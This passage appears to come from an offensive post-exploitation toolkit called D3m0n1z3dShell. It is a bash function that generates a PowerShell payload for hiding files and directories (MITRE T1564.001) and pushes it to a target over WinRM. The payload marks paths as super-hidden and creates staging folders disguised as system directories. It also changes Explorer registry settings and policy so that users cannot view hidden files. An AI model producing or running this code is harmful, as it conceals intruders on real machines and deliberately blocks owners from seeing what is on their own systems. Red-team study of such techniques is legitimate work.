# 2. T1564.001 — Hidden Files and Directories
# ──────────────────────────────────────────────
gen_hidden() {
    echo -e "${CYAN}[*] T1564.001 — Hidden Files & Directories${NC}"

    local OUTFILE="${PAYLOAD_DIR}/win_hidden.ps1"
    cat > "$OUTFILE" << 'PSEOF'
# T1564.001 — Hidden Files and Directories
# Generated by D3m0n1z3dShell

Write-Host "=== Hidden File/Directory Toolkit ===" -ForegroundColor Cyan

function Set-SuperHidden {
    param([string]$Path)

    if (-not (Test-Path $Path)) {
        Write-Host "[-] Path not found: $Path" -ForegroundColor Red
        return
    }

    $item = Get-Item $Path -Force
    # Set Hidden + System + NotContentIndexed
    $item.Attributes = $item.Attributes -bor [IO.FileAttributes]::Hidden
    $item.Attributes = $item.Attributes -bor [IO.FileAttributes]::System
    $item.Attributes = $item.Attributes -bor [IO.FileAttributes]::NotContentIndexed

    Write-Host "[+] Super-hidden: $Path" -ForegroundColor Green
    Write-Host "    Attributes: $($item.Attributes)" -ForegroundColor White
}

function New-HiddenDirectory {
    param([string]$BasePath = "C:\Users\Public")

    # Use a name that looks like a system folder
    $names = @("$BasePath\AppData", "$BasePath\{AB1F5E3C-1234-4567-8901-ABCDEF123456}",
               "$BasePath\.cache", "$BasePath\SystemProfile")

    $dir = $names | Get-Random
    New-Item -ItemType Directory -Path $dir -Force | Out-Null
    Set-SuperHidden $dir
    Write-Host "[+] Hidden directory created: $dir" -ForegroundColor Green
    return $dir
}

function Disable-ShowHidden {
    # Prevent users from seeing hidden files even if they toggle Explorer setting
    Write-Host "[*] Disabling 'Show Hidden Files' in Explorer..." -ForegroundColor Yellow
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
        Set-ItemProperty -Path $regPath -Name "Hidden" -Value 2 -Type DWord -Force
        Set-ItemProperty -Path $regPath -Name "ShowSuperHidden" -Value 0 -Type DWord -Force
        # Also set policy to prevent toggling
        $polPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        New-Item -Path $polPath -Force -ErrorAction SilentlyContinue | Out-Null
        Set-ItemProperty -Path $polPath -Name "NoFolderOptions" -Value 1 -Type DWord -Force
        Write-Host "[+] Explorer hidden file display locked off" -ForegroundColor Green
    } catch {
        Write-Host "[-] Failed: $_" -ForegroundColor Red
    }
}

# Interactive
$target = Read-Host "Path to hide (file or directory)"
if ($target) { Set-SuperHidden $target }

Write-Host ""
$createDir = Read-Host "Create hidden staging directory? (y/N)"
if ($createDir -match '^[Yy]') { New-HiddenDirectory }

$lockExplorer = Read-Host "Lock Explorer 'Show Hidden Files' off? (y/N)"
if ($lockExplorer -match '^[Yy]') { Disable-ShowHidden }
PSEOF

    echo -e "${GREEN}[+] Payload generated: ${OUTFILE}${NC}"
    _winrm_deliver "$OUTFILE"
}

